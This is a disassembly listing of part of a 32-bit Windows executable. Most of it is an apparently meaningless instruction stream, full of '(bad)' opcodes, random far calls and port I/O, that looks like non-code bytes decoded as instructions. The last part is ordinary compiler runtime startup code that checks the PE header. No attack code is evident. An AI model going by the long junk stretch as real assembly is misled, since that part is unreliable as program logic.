  42231c:	sar    BYTE PTR [ecx-0x106e467f],cl
  422322:	xor    al,0x72
  422324:	mov    dh,0xf7
  422326:	jb     0x4222eb
  422328:	shl    BYTE PTR [ecx+0x4a],1
  42232b:	push   DWORD PTR [ebp-0x74]
  42232e:	jmp    0x7749d032
  422333:	dec    edi
  422334:	xchg   DWORD PTR [eax-0xe],ecx
  422337:	jle    0x422388
  422339:	retf   
  42233a:	sbb    al,0x4d
  42233c:	or     al,BYTE PTR [edi]
  42233e:	stos   DWORD PTR es:[edi],eax
  42233f:	add    DWORD PTR [eax+0x49],ebx
  422342:	mov    ds:0xa878ffac,al
  422347:	lahf   
  422348:	fidiv  DWORD PTR [ebx-0x4d]
  42234b:	outs   dx,DWORD PTR ds:[esi]
  42234c:	enter  0x3d31,0x6e
  422350:	or     dh,BYTE PTR [eax]
  422352:	out    0x84,eax
  422354:	call   0xf349:0x51367d2b
  42235b:	(bad)  
  42235c:	fidiv  DWORD PTR [edi+0x1be124b2]
  422362:	xor    DWORD PTR [ebp-0x59],ecx
  422365:	cmp    al,0x6c
  422367:	leave  
  422368:	mov    cl,0xdb
  42236a:	arpl   WORD PTR [edx],cx
  42236c:	inc    ebp
  42236d:	add    al,0xac
  42236f:	int3   
  422370:	popf   
  422371:	adc    cl,BYTE PTR [ebx+0x698adf73]
  422377:	inc    edi
  422378:	mov    WORD PTR [ecx],ds
  42237a:	(bad)  [esi+0x2]
  42237d:	enter  0x74e4,0x55
  422381:	das    
  422382:	into   
  422383:	xchg   ecx,eax
  422384:	push   edx
  422385:	pop    edi
  422386:	pop    ecx
  422387:	xchg   bl,bh
  422389:	mov    edi,0x5d5da470
  42238e:	xchg   ecx,eax
  42238f:	pop    ds
  422390:	push   ss
  422391:	aas    
  422392:	mov    bh,0xad
  422394:	(bad)  
  422395:	scas   eax,DWORD PTR es:[edi]
  422396:	mov    ch,0xd1
  422398:	push   ebx
  422399:	jae    0x4223a6
  42239b:	push   ecx
  42239c:	jg     0x42231e
  42239e:	dec    ebp
  42239f:	xchg   esp,eax
  4223a0:	mov    esp,0xd35c15eb
  4223a5:	sbb    ch,BYTE PTR [esp+edx*8+0x4b2ce8d4]
  4223ac:	xchg   edi,eax
  4223ad:	jns    0x4223a3
  4223af:	mov    ds:0x1539c8fc,al
  4223b4:	pusha  
  4223b5:	jae    0x4223de
  4223b7:	push   edx
  4223b8:	rcr    bh,1
  4223ba:	xchg   DWORD PTR [ebx-0x6d175d15],edi
  4223c0:	or     DWORD PTR [ebx],edi
  4223c2:	push   ebx
  4223c3:	jns    0x422417
  4223c5:	pushf  
  4223c6:	pop    es
  4223c7:	aaa    
  4223c8:	loope  0x422406
  4223ca:	cld    
  4223cb:	inc    edx
  4223cc:	adc    al,0x35
  4223ce:	push   ecx
  4223cf:	pushf  
  4223d0:	mov    cl,0x41
  4223d2:	out    dx,al
  4223d3:	push   0x4c
  4223d5:	shr    DWORD PTR [esi-0x69],cl
  4223d8:	dec    esi
  4223d9:	(bad)  [esi-0xf995ac0]
  4223df:	out    dx,eax
  4223e0:	xchg   edx,eax
  4223e1:	mov    ds:0xc2dea5e4,al
  4223e6:	pop    ecx
  4223e7:	arpl   WORD PTR [edx],di
  4223e9:	or     ebp,eax
  4223eb:	xchg   ecx,eax
  4223ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223ed:	aam    0x48
  4223ef:	xor    ch,dh
  4223f1:	pop    ecx
  4223f2:	adc    al,0x59
  4223f4:	mov    DWORD PTR [ecx+ecx*4-0x7cc53c2f],eax
  4223fb:	mov    es,WORD PTR [ecx+0x16]
  4223fe:	scas   eax,DWORD PTR es:[edi]
  4223ff:	loopne 0x4223e0
  422401:	mov    bl,0xd8
  422403:	dec    eax
  422404:	sbb    cl,ch
  422406:	mov    bh,0x3f
  422408:	cld    
  422409:	push   0x7fc5c9e3
  42240e:	push   es
  42240f:	(bad)  
  422411:	fs jb  0x4223f7
  422414:	mov    eax,0x665a1df8
  422419:	fucomp st(6)
  42241b:	hlt    
  42241c:	or     dh,BYTE PTR [ebp+0xd28e686]
  422422:	stc    
  422423:	test   DWORD PTR [ecx],eax
  422425:	mov    al,ds:0xa323630
  42242a:	push   esp
  42242b:	outs   dx,DWORD PTR ds:[esi]
  42242c:	push   ds
  42242d:	inc    eax
  42242f:	retf   0x3133
  422432:	fbld   TBYTE PTR [eax]
  422434:	(bad)  
  422435:	andps  xmm3,XMMWORD PTR [esi]
  422438:	sub    BYTE PTR [ebx-0x61],dh
  42243b:	xchg   ah,cl
  42243d:	retf   
  42243e:	sbb    eax,0xca630477
  422443:	sar    BYTE PTR [ebp-0x7deabf6d],1
  422449:	sahf   
  42244a:	pop    es
  42244b:	fiadd  WORD PTR [edi-0xc]
  42244e:	test   al,0x9
  422450:	jno    0x4224c2
  422452:	(bad)  
  422453:	sub    ebx,ecx
  422455:	add    BYTE PTR [ecx+eiz*4+0x73],ch
  422459:	pusha  
  42245a:	xchg   BYTE PTR [edi],dh
  42245c:	lahf   
  42245d:	sbb    eax,0xf2a05bf5
  422462:	mov    edi,0x6f84e273
  422467:	call   0x5447:0x9be3a3a
  42246e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42246f:	ins    BYTE PTR es:[edi],dx
  422470:	hlt    
  422471:	jne    0x422448
  422473:	xor    ecx,esp
  422475:	or     esi,esp
  422477:	popa   
  422478:	sub    esi,DWORD PTR [ebp+0xa]
  42247b:	fmul   DWORD PTR ds:0x3ebbec70
  422481:	fs test dh,dh
  422484:	out    0x9c,al
  422486:	jo     0x4224f9
  422488:	shl    eax,cl
  42248a:	scas   eax,DWORD PTR es:[edi]
  42248b:	fcomp  DWORD PTR [ebp-0x41]
  42248e:	xchg   ebx,eax
  42248f:	mov    ds:0xbbbf5b66,al
  422494:	mov    edx,0x94de674
  422499:	add    bl,ah
  42249b:	mov    esi,0x1fd228f
  4224a0:	pop    eax
  4224a1:	xor    ecx,DWORD PTR [esi+eiz*2+0x23]
  4224a5:	dec    ecx
  4224a6:	mov    ecx,0x9e2fa51c
  4224ab:	adc    ebx,DWORD PTR [ecx+edx*4+0x2f]
  4224af:	test   BYTE PTR [ecx+edi*8],0xcf
  4224b3:	xor    BYTE PTR [esi],al
  4224b5:	popa   
  4224b6:	add    al,0x6f
  4224b8:	call   0xbd48:0x73a8ed69
  4224bf:	add    al,0xeb
  4224c1:	or     eax,0x14943be0
  4224c6:	hlt    
  4224c7:	(bad)  
  4224c8:	(bad)  
  4224c9:	xlat   BYTE PTR ds:[ebx]
  4224ca:	and    al,0xaf
  4224cc:	push   ebp
  4224cd:	sbb    eax,0x334bd4b2
  4224d2:	sub    al,0x72
  4224d4:	cmp    al,BYTE PTR [edi+0x3d]
  4224d7:	mov    ds:0x5b5675ec,al
  4224dc:	add    cl,cl
  4224de:	fisttp DWORD PTR [eax]
  4224e0:	cmp    DWORD PTR ds:0x4024bb7f,eax
  4224e6:	mov    ebx,0x8a1422c6
  4224eb:	pop    edi
  4224ec:	sti    
  4224ed:	in     eax,dx
  4224ee:	rol    DWORD PTR [esp+ecx*1+0x45],0xe8
  4224f3:	mov    ch,0x95
  4224f5:	mov    ecx,0xd489d21d
  4224fa:	sbb    al,BYTE PTR ds:0x963c99f6
  422500:	test   al,0x5b
  422502:	dec    esp
  422503:	cmp    edx,esp
  422505:	fwait
  422506:	sbb    al,0x12
  422508:	push   ds
  422509:	inc    eax
  42250a:	scas   al,BYTE PTR es:[edi]
  42250b:	push   esp
  42250c:	mov    dh,0xe8
  42250e:	cs pop esi
  422510:	int    0xa4
  422512:	add    al,BYTE PTR [esi]
  422514:	lods   al,BYTE PTR ds:[esi]
  422515:	sub    eax,ecx
  422517:	jns    0x42249b
  422519:	imul   ebx,DWORD PTR [ebx+0x48],0x46
  42251d:	scas   al,BYTE PTR es:[edi]
  42251e:	cli    
  42251f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422520:	fcmovnbe st,st(1)
  422522:	sub    al,0xad
  422524:	jmp    0xcc29:0xa28b9366
  42252b:	in     al,dx
  42252c:	adc    DWORD PTR [ecx+0x3e],eax
  42252f:	cmp    ecx,esp
  422531:	std    
  422532:	pop    eax
  422533:	push   ecx
  422534:	adc    eax,0xb45439af
  422539:	dec    esi
  42253a:	call   0x325c:0xeef25ac7
  422541:	xor    edx,DWORD PTR [eax-0x46]
  422544:	pop    ss
  422545:	call   0x6bc90341
  42254a:	or     eax,0x9efd8948
  42254f:	les    edx,FWORD PTR [ebx-0x29]
  422552:	pop    edx
  422553:	call   0xe1205438
  422558:	cmc    
  422559:	pop    edx
  42255a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42255b:	inc    ebx
  42255c:	lods   eax,DWORD PTR ds:[esi]
  42255d:	leave  
  42255e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42255f:	outs   dx,DWORD PTR ds:[esi]
  422560:	lds    ebp,FWORD PTR [esi-0x23eabc38]
  422566:	push   edx
  422567:	(bad)  
  422569:	sub    eax,0x77cce910
  42256e:	mov    dl,0xd4
  422570:	ret    0xe333
  422573:	xchg   esp,eax
  422574:	add    BYTE PTR [esi+0x47],ch
  422577:	mov    bl,0xfe
  422579:	sub    edx,DWORD PTR [ecx+edi*1-0x42]
  42257d:	jle    0x4225b4
  42257f:	(bad)  
  422580:	sar    BYTE PTR [esi+0x6f],1
  422583:	jmp    0xbff4:0x7926fb44
  42258a:	idiv   ch
  42258c:	popf   
  42258d:	mov    edx,0xdce351ba
  422592:	(bad)  
  422594:	scas   al,BYTE PTR es:[di]
  422596:	fst    DWORD PTR [ebx+0x3a7b415]
  42259c:	(bad)  
  42259d:	push   ebp
  42259e:	jmp    0x422585
  4225a0:	and    DWORD PTR [eax-0x77989514],0x2c1b0caa
  4225aa:	icebp  
  4225ab:	and    DWORD PTR [ebx],edi
  4225ad:	pushf  
  4225ae:	test   al,0xc7
  4225b0:	rol    ebp,1
  4225b2:	dec    eax
  4225b3:	loope  0x422626
  4225b5:	mov    ds:0xd12d29aa,eax
  4225ba:	add    al,BYTE PTR [ecx-0x28]
  4225bd:	adc    bh,BYTE PTR [ecx+edx*8+0x37]
  4225c1:	xor    eax,0xea938870
  4225c6:	mov    BYTE PTR [eax-0x27],ah
  4225c9:	(bad)  
  4225ca:	sbb    al,0xf6
  4225cc:	push   esp
  4225cd:	adc    DWORD PTR [esi+0x3eb60ec8],esi
  4225d3:	stos   BYTE PTR es:[edi],al
  4225d4:	sahf   
  4225d5:	div    ecx
  4225d7:	ret    
  4225d8:	rcr    eax,cl
  4225da:	mov    bl,0xb7
  4225dc:	mov    esi,0xb3c27534
  4225e1:	rcr    BYTE PTR ds:0x7f2f4c20,0x48
  4225e8:	pusha  
  4225e9:	scas   eax,DWORD PTR es:[edi]
  4225ea:	loopne 0x4225df
  4225ec:	adc    eax,0x25af8934
  4225f1:	jae    0x422665
  4225f3:	fs cmp dh,ch
  4225f6:	ret    0xfec0
  4225f9:	add    ebx,DWORD PTR [ebx-0x1adddf0f]
  4225ff:	setbe  BYTE PTR [edx-0x7593ff4c]
  422606:	pop    ebp
  422607:	test   eax,0x2725be91
  42260c:	jno    0x422687
  42260e:	dec    ecx
  42260f:	popf   
  422610:	lea    edx,[ebx+0x7a]
  422613:	mov    ds:0x9eff9ed9,al
  422618:	jmp    0xce838e63
  42261d:	adc    BYTE PTR [ebp+0x7848b681],al
  422623:	push   ebx
  422624:	pop    ebx
  422625:	xchg   esp,eax
  422626:	cmc    
  422627:	sub    al,0xe5
  422629:	pop    edi
  42262a:	inc    edi
  42262b:	or     ebx,DWORD PTR [eax-0x5c]
  42262e:	es mov edi,0x84464d16
  422634:	cdq    
  422635:	jns    0x4225b9
  422637:	cdq    
  422638:	or     edx,esi
  42263a:	dec    ebp
  42263b:	inc    edi
  42263c:	jb     0x4226a3
  42263e:	mov    eax,0x2ccb9f6
  422643:	mov    ds:0xd2c9f04f,al
  422648:	in     al,0xa9
  42264a:	jmp    0x4225f4
  42264c:	jmp    0x5413:0x20a8c16b
  422653:	jae    0x422663
  422655:	test   BYTE PTR [ecx],ah
  422657:	dec    ebx
  422658:	mov    ebp,0x8024df3e
  42265d:	cmp    dh,0x44
  422660:	lods   al,BYTE PTR ds:[esi]
  422661:	lahf   
  422662:	sbb    eax,0x9275cd5b
  422667:	pop    ds
  422668:	bound  ebx,QWORD PTR cs:[ecx]
  42266b:	dec    esp
  42266c:	or     BYTE PTR [eax-0x257ca05b],dl
  422672:	je     0x422610
  422674:	xor    al,0x69
  422676:	push   cs
  422677:	mov    ds:0x39935055,eax
  42267c:	(bad)  
  42267d:	in     al,dx
  42267e:	loop   0x422654
  422680:	sub    cl,BYTE PTR [esp+ecx*1-0x64208fb4]
  422687:	outs   dx,DWORD PTR ds:[esi]
  422688:	sbb    eax,0xb9d69912
  42268d:	loopne 0x4226be
  42268f:	test   BYTE PTR [edi+0x3e],0x7b
  422693:	add    esi,DWORD PTR [eax-0x9]
  422696:	mov    ebx,esp
  422698:	aaa    
  422699:	push   0xffffffaa
  42269b:	(bad)  
  42269c:	fild   QWORD PTR [esi-0x28e02c2f]
  4226a2:	sbb    BYTE PTR [ebx-0x36],0x6a
  4226a6:	popf   
  4226a7:	inc    ebx
  4226a8:	jge    0x422636
  4226aa:	retf   0xe414
  4226ad:	test   DWORD PTR [ecx-0x69],esi
  4226b0:	rcr    BYTE PTR [ebx-0x1],cl
  4226b3:	push   ds
  4226b4:	je     0x42270e
  4226b6:	and    al,0xcd
  4226b8:	cmp    DWORD PTR [eax],0x1cf41e48
  4226be:	mov    ah,BYTE PTR [esi+0x2a]
  4226c1:	div    DWORD PTR [edi+0x59]
  4226c4:	stos   BYTE PTR es:[edi],al
  4226c5:	xor    ebp,DWORD PTR [ebx+0x24a43685]
  4226cb:	adc    al,0x67
  4226cd:	inc    ebp
  4226ce:	daa    
  4226cf:	fwait
  4226d0:	sbb    eax,0x7533129d
  4226d5:	ret    
  4226d6:	adc    al,0xd3
  4226d8:	sub    edi,esi
  4226da:	mov    edx,0xf333e64e
  4226df:	push   esp
  4226e0:	mov    cl,0xbd
  4226e2:	lds    ebx,FWORD PTR [ecx+0x7f6f5f4f]
  4226e8:	pushf  
  4226e9:	and    DWORD PTR [edx+ecx*4],eax
  4226ec:	nop
  4226ed:	push   edx
  4226ee:	sub    al,al
  4226f0:	mov    ebp,0x2bcc01dc
  4226f5:	pop    ebx
  4226f6:	mov    ds:0xd2368480,al
  4226fb:	cmp    ah,BYTE PTR [edi]
  4226fd:	jp     0x422751
  4226ff:	jmp    0x422748
  422701:	test   DWORD PTR [ebp-0x357c3f73],esi
  422707:	inc    ebx
  422708:	xchg   BYTE PTR [edx],ah
  42270a:	aas    
  42270b:	or     ah,BYTE PTR [edi]
  42270d:	aas    
  42270e:	xor    ah,al
  422710:	jle    0x4226f6
  422712:	jo     0x422701
  422714:	push   eax
  422715:	sub    ebx,ebx
  422717:	aaa    
  422718:	and    BYTE PTR [edi+0x4f785728],0x92
  42271f:	mov    bl,0xb7
  422721:	jmp    0x2933cbd
  422726:	adc    bh,ah
  422728:	pop    esi
  422729:	jp     0x4226ad
  42272b:	inc    ecx
  42272c:	lds    esp,FWORD PTR [eax+0x64831156]
  422732:	lods   al,BYTE PTR ds:[esi]
  422733:	xlat   BYTE PTR ds:[ebx]
  422734:	(bad)  
  422735:	and    al,0x51
  422737:	test   bl,bh
  422739:	repnz dec edi
  42273b:	pop    ds
  42273c:	jl     0x422790
  42273e:	xchg   ebp,eax
  42273f:	or     al,0xaa
  422741:	ds adc esp,edx
  422744:	mov    bl,0xd7
  422746:	addr16 dec esp
  422748:	cmp    DWORD PTR [eax+0x31],0x65
  42274c:	push   cs
  42274d:	jb     0x4226e7
  42274f:	pop    edx
  422750:	or     ebx,DWORD PTR [ecx-0x35]
  422753:	shr    BYTE PTR [edx],0xc8
  422756:	int3   
  422757:	stos   DWORD PTR es:[edi],eax
  422758:	sbb    al,0xff
  42275a:	retf   
  42275b:	fwait
  42275c:	scas   eax,DWORD PTR es:[edi]
  42275d:	dec    edi
  42275e:	jo     0x422702
  422760:	mov    eax,ds:0x8a28b3e9
  422765:	and    BYTE PTR [edx-0x9],al
  422768:	ja     0x4226f6
  42276a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42276b:	scas   eax,DWORD PTR es:[edi]
  42276c:	xchg   dh,cl
  42276e:	inc    edi
  42276f:	dec    esi
  422770:	mov    ds:0x3d6f5c8a,eax
  422775:	dec    esi
  422776:	imul   esi,DWORD PTR [ebx+0x47accce4],0xffffffec
  42277d:	mov    ecx,0x810c58b
  422782:	jge    0x4227ca
  422784:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422785:	fs popa 
  422787:	fwait
  422788:	mov    dh,bl
  42278a:	adc    esp,DWORD PTR [edi+eiz*8+0x200885dc]
  422791:	int    0x60
  422793:	add    esi,ecx
  422795:	mov    cl,BYTE PTR [edi+eax*4-0x141f6afa]
  42279c:	pop    edi
  42279d:	(bad)  
  42279e:	enter  0x3f6b,0x8a
  4227a2:	inc    esi
  4227a3:	pop    ebx
  4227a4:	push   0x67
  4227a6:	add    DWORD PTR [ebx+0x558403bf],eax
  4227ac:	pop    ds
  4227ad:	sub    DWORD PTR [ecx-0x46],0xffffffd9
  4227b1:	clc    
  4227b2:	loope  0x4227b7
  4227b4:	test   DWORD PTR [eax-0x3589e4e9],edx
  4227ba:	jo     0x422833
  4227bc:	or     DWORD PTR [edi+0x13d6f639],esi
  4227c2:	stos   DWORD PTR es:[edi],eax
  4227c3:	inc    ebp
  4227c4:	out    0x6,eax
  4227c6:	xor    DWORD PTR [ebx],0x9aa48956
  4227cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4227cd:	xchg   DWORD PTR [ecx+0x64],edx
  4227d0:	ror    DWORD PTR [edi-0x3a],1
  4227d3:	jle    0x42280e
  4227d5:	inc    ebp
  4227d6:	js     0x4227ca
  4227d8:	mov    ecx,0xc68f473
  4227dd:	retf   0x38f2
  4227e0:	adc    dl,BYTE PTR [edi]
  4227e2:	inc    ecx
  4227e3:	xor    al,0xb0
  4227e5:	pop    ds
  4227e6:	cli    
  4227e7:	stc    
  4227e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227e9:	sbb    ecx,DWORD PTR [edx+0x33b9e047]
  4227ef:	fsub   QWORD PTR [ebx+ecx*1-0x4be0b908]
  4227f6:	mov    ds:0x4c0f74ae,eax
  4227fb:	test   BYTE PTR [eax],ch
  4227fd:	mov    edi,0x583a6a53
  422802:	jmp    0x99f45b1a
  422807:	bound  edi,QWORD PTR [eax+eax*8-0x76]
  42280b:	xor    ah,BYTE PTR [esi]
  42280d:	fs pop ss
  42280f:	dec    esi
  422810:	inc    BYTE PTR [edx-0x717793c6]
  422816:	xchg   ebp,eax
  422817:	(bad)  
  422818:	je     0x4227d9
  42281a:	loop   0x42285c
  42281c:	lea    eax,[eax-0x51]
  42281f:	fdivr  DWORD PTR [esi-0x5e]
  422822:	test   eax,0x6f9d166e
  422827:	sahf   
  422828:	xchg   esi,eax
  422829:	adc    ah,0xb7
  42282c:	fbstp  TBYTE PTR [esi+ebp*2-0x4d706229]
  422834:	leave  
  422835:	ror    dh,0xf0
  422838:	or     BYTE PTR [edx-0x42],0x61
  42283c:	xchg   ebp,eax
  42283d:	adc    eax,0x1845358f
  422842:	repz sub eax,DWORD PTR [ecx-0x6]
  422846:	inc    esi
  422847:	enter  0x5825,0xf3
  42284b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42284c:	fistp  QWORD PTR [edx-0x688e5761]
  422852:	mov    ss,WORD PTR [esi]
  422854:	popf   
  422855:	pop    ecx
  422856:	mov    dh,0x4c
  422858:	xor    DWORD PTR [ebx],ebx
  42285a:	xchg   esi,eax
  42285b:	out    dx,eax
  42285c:	pop    ebp
  42285d:	and    edx,ebx
  42285f:	mov    edi,0xbcb7b026
  422864:	jp     0x42284a
  422866:	pusha  
  422867:	idiv   edx
  422869:	cld    
  42286a:	sbb    esp,edi
  42286c:	jmp    0x4228c4
  42286e:	mov    al,0x84
  422870:	mov    al,0x99
  422872:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422873:	pop    DWORD PTR [eax-0x1eaf1a2]
  422879:	xor    BYTE PTR [esp+eiz*2-0x6],ah
  42287d:	test   DWORD PTR [ecx+0x30873d01],edi
  422883:	or     esi,DWORD PTR [ecx+0x1e4f4ab]
  422889:	and    ch,dh
  42288b:	sbb    edi,DWORD PTR [ebp+edx*1+0x36b4dbd2]
  422892:	jnp    0x4228db
  422894:	jp     0x422866
  422896:	cmc    
  422897:	pop    edi
  422898:	(bad)  
  422899:	cmp    al,BYTE PTR [edx]
  42289b:	loopne 0x42291a
  42289d:	jl     0x5ee05f60
  4228a3:	das    
  4228a4:	jle    0x42283c
  4228a6:	or     al,0x51
  4228a8:	clc    
  4228a9:	and    al,BYTE PTR [edi]
  4228ab:	ja     0x42291d
  4228ad:	lea    ebx,[ebp+0x63be2a34]
  4228b3:	jns    0x422839
  4228b5:	inc    edi
  4228b6:	jl     0x4228f4
  4228b8:	fs std 
  4228ba:	outs   dx,DWORD PTR ds:[esi]
  4228bb:	and    BYTE PTR [ebx-0x2cd5946f],0x3c
  4228c2:	cmp    al,0xf7
  4228c4:	stos   BYTE PTR es:[edi],al
  4228c5:	xchg   BYTE PTR [eax+0x640ad4f3],bh
  4228cb:	imul   ecx,DWORD PTR [ebp+0x6d0f408],0xffffffb0
  4228d2:	xchg   sp,ax
  4228d4:	xchg   BYTE PTR [ebx+ecx*8+0x5021a9db],cl
  4228db:	push   ebp
  4228dc:	call   0x1a9c06
  4228e1:	jecxz  0x4228b0
  4228e3:	mov    ah,0xc7
  4228e5:	and    edx,DWORD PTR [esi+esi*4-0xe]
  4228e9:	das    
  4228ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228eb:	lock outs dx,BYTE PTR ds:[esi]
  4228ed:	(bad)  
  4228ee:	or     ebx,DWORD PTR [ecx]
  4228f0:	dec    eax
  4228f1:	add    ah,bh
  4228f3:	stos   BYTE PTR es:[edi],al
  4228f4:	cmp    ebx,ebx
  4228f6:	shr    BYTE PTR [edx+eiz*2-0x35],1
  4228fa:	adc    BYTE PTR [ecx+0x1f],bl
  4228fd:	cmp    cl,dh
  4228ff:	sbb    BYTE PTR [ecx+0x7c41bd3a],ch
  422905:	leave  
  422906:	dec    ecx
  422907:	adc    eax,0xaad3debf
  42290c:	jae    0x422939
  42290e:	ins    DWORD PTR es:[edi],dx
  42290f:	cld    
  422910:	adc    DWORD PTR [ebx],esi
  422912:	xchg   edi,eax
  422913:	inc    esi
  422914:	gs pop es
  422916:	jo     0x4228aa
  422918:	jo     0x422976
  42291a:	jmp    0xc304:0xb7a8f614
  422921:	mov    esi,DWORD PTR [edi-0x57]
  422924:	sahf   
  422925:	stc    
  422926:	loop   0x4228fa
  422928:	inc    ecx
  422929:	pop    ebx
  42292a:	mov    edx,0x53f70ff6
  42292f:	mov    ds:0x15d92520,eax
  422934:	pop    es
  422935:	stos   DWORD PTR es:[edi],eax
  422936:	push   eax
  422937:	xor    cl,BYTE PTR [ebp-0x26]
  42293a:	cwde   
  42293b:	dec    esp
  42293c:	into   
  42293d:	xor    ebp,DWORD PTR [edi]
  42293f:	dec    eax
  422940:	stos   DWORD PTR es:[edi],eax
  422941:	mov    es,WORD PTR [eax-0x6d]
  422944:	and    eax,0xde8e17d9
  422949:	ins    BYTE PTR es:[edi],dx
  42294a:	jo     0x422907
  42294c:	inc    edx
  42294d:	cli    
  42294e:	jno    0x422915
  422950:	repz mov dh,0xd2
  422953:	push   edi
  422954:	jmp    0x234bb273
  422959:	jmp    0x59c1874e
  42295e:	xor    eax,0x44b78240
  422963:	in     al,0x1c
  422965:	jg     0x4229ab
  422967:	iret   
  422968:	ss xchg ebp,eax
  42296a:	add    al,0x55
  42296c:	pusha  
  42296d:	push   edi
  42296e:	call   0xa0a8:0x89416439
  422975:	sub    cl,BYTE PTR cs:[edi]
  422978:	dec    esi
  422979:	sbb    edx,DWORD PTR [esi-0x11d26eed]
  42297f:	fwait
  422980:	icebp  
  422981:	pop    es
  422982:	push   ss
  422983:	jp     0x4229ae
  422985:	xor    al,0xa7
  422987:	lock dec esi
  422989:	mov    esi,0x492f8b6
  42298e:	adc    DWORD PTR [ebp+0x79],esp
  422991:	jecxz  0x422989
  422993:	pop    esi
  422994:	lea    ebp,[edi]
  422996:	inc    ebp
  422997:	call   0xe515a7c8
  42299c:	inc    DWORD PTR [edx+0x62556840]
  4229a2:	lahf   
  4229a3:	popa   
  4229a4:	xchg   bl,dh
  4229a6:	push   ecx
  4229a7:	xor    bh,BYTE PTR ds:0x6b1474c0
  4229ad:	pop    esp
  4229ae:	mov    esp,0xd65bd0e
  4229b3:	dec    esp
  4229b4:	cmp    DWORD PTR [ebp-0x48c6ce6a],edx
  4229ba:	xchg   ecx,eax
  4229bb:	out    dx,eax
  4229bc:	dec    eax
  4229bd:	bnd jge 0x422941
  4229c0:	mov    ah,0xab
  4229c2:	fimul  DWORD PTR [edx+0x1a95837e]
  4229c8:	lock outs dx,BYTE PTR ds:[esi]
  4229ca:	inc    edx
  4229cb:	dec    esi
  4229cc:	push   0x2
  4229ce:	push   0xa0
  4229d3:	push   0x0
  4229d5:	call   DWORD PTR ds:0x428030
  4229db:	xor    eax,eax
  4229dd:	add    esp,0x10
  4229e0:	ret    0x10
  4229e3:	nop
  4229e4:	nop
  4229e5:	nop
  4229e6:	nop
  4229e7:	nop
  4229e8:	nop
  4229e9:	nop
  4229ea:	nop
  4229eb:	nop
  4229ec:	nop
  4229ed:	nop
  4229ee:	nop
  4229ef:	nop
  4229f0:	jmp    DWORD PTR ds:0x428128
  4229f6:	jmp    DWORD PTR ds:0x428120
  4229fc:	cmp    DWORD PTR ds:0x462c9c,0x1
  422a03:	jne    0x422a0a
  422a05:	call   0x422f48
  422a0a:	push   DWORD PTR [esp+0x4]
  422a0e:	call   0x422dd1
  422a13:	push   0xff
  422a18:	call   DWORD PTR ds:0x46238c
  422a1e:	pop    ecx
  422a1f:	pop    ecx
  422a20:	ret    
  422a21:	cmp    DWORD PTR ds:0x462c9c,0x1
  422a28:	jne    0x422a2f
  422a2a:	call   0x422f48
  422a2f:	push   DWORD PTR [esp+0x4]
  422a33:	call   0x422dd1
  422a38:	push   0xff
  422a3d:	call   0x422c17
  422a42:	pop    ecx
  422a43:	pop    ecx
  422a44:	ret    
  422a45:	push   0x60
  422a47:	push   0x428160
  422a4c:	call   0x423934
  422a51:	mov    edi,0x94
  422a56:	mov    eax,edi
  422a58:	call   0x423980
  422a5d:	mov    DWORD PTR [ebp-0x18],esp
  422a60:	mov    esi,esp
  422a62:	mov    DWORD PTR [esi],edi
  422a64:	push   esi
  422a65:	call   DWORD PTR ds:0x42806c
  422a6b:	mov    ecx,DWORD PTR [esi+0x10]
  422a6e:	mov    DWORD PTR ds:0x462ca4,ecx
  422a74:	mov    eax,DWORD PTR [esi+0x4]
  422a77:	mov    ds:0x462cb0,eax
  422a7c:	mov    edx,DWORD PTR [esi+0x8]
  422a7f:	mov    DWORD PTR ds:0x462cb4,edx
  422a85:	mov    esi,DWORD PTR [esi+0xc]
  422a88:	and    esi,0x7fff
  422a8e:	mov    DWORD PTR ds:0x462ca8,esi
  422a94:	cmp    ecx,0x2
  422a97:	je     0x422aa5
  422a99:	or     esi,0x8000
  422a9f:	mov    DWORD PTR ds:0x462ca8,esi
  422aa5:	shl    eax,0x8
  422aa8:	add    eax,edx
  422aaa:	mov    ds:0x462cac,eax
  422aaf:	xor    esi,esi
  422ab1:	push   esi
  422ab2:	mov    edi,DWORD PTR ds:0x428018
  422ab8:	call   edi
  422aba:	cmp    WORD PTR [eax],0x5a4d
  422abf:	jne    0x422ae0
  422ac1:	mov    ecx,DWORD PTR [eax+0x3c]
  422ac4:	add    ecx,eax
  422ac6:	cmp    DWORD PTR [ecx],0x4550
  422acc:	jne    0x422ae0
  422ace:	movzx  eax,WORD PTR [ecx+0x18]
  422ad2:	cmp    eax,0x10b
  422ad7:	je     0x422af8
  422ad9:	cmp    eax,0x20b
  422ade:	je     0x422ae5
  422ae0:	mov    DWORD PTR [ebp-0x1c],esi
  422ae3:	jmp    0x422b0c
  422ae5:	cmp    DWORD PTR [ecx+0x84],0xe
  422aec:	jbe    0x422ae0
  422aee:	xor    eax,eax
  422af0:	cmp    DWORD PTR [ecx+0xf8],esi
  422af6:	jmp    0x422b06
  422af8:	cmp    DWORD PTR [ecx+0x74],0xe
  422afc:	jbe    0x422ae0
  422afe:	xor    eax,eax
  422b00:	cmp    DWORD PTR [ecx+0xe8],esi
  422b06:	setne  al
  422b09:	mov    DWORD PTR [ebp-0x1c],eax
  422b0c:	push   0x1
  422b0e:	call   0x4238e3
  422b13:	pop    ecx
  422b14:	test   eax,eax
  422b16:	jne    0x422b20
  422b18:	push   0x1c
  422b1a:	call   0x422a21
  422b1f:	pop    ecx
  422b20:	call   0x42385a
  422b25:	test   eax,eax
  422b27:	jne    0x422b31
  422b29:	push   0x10
  422b2b:	call   0x422a21
  422b30:	pop    ecx
  422b31:	call   0x423743
  422b36:	mov    DWORD PTR [ebp-0x4],esi
  422b39:	call   0x423545
  422b3e:	test   eax,eax
  422b40:	jge    0x422b4a
  422b42:	push   0x1b
  422b44:	call   0x4229fc
  422b49:	pop    ecx
  422b4a:	call   DWORD PTR ds:0x428068
  422b50:	mov    ds:0x463454,eax
  422b55:	call   0x423423
  422b5a:	mov    ds:0x462c94,eax
  422b5f:	call   0x423381
